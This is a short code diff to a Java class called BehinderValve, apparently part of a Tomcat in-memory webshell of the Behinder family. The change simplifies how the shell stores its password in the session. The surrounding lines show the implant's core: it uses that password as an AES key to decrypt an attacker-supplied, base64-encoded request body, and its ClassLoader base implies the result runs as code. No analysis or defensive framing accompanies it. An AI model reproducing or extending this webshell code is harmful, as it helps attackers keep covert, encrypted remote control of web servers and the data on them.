@@ -84,11 +84,7 @@ public class BehinderValve extends ClassLoader implements Valve {
                 obj.put("request", request);
                 obj.put("response", response);
                 obj.put("session", session);
-                try {
-                    session.putValue("u", this.pass);
-                } catch (NoSuchMethodError e) {
-                    session.setAttribute("u", this.pass);
-                }
+                session.setAttribute("u", this.pass);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                 byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
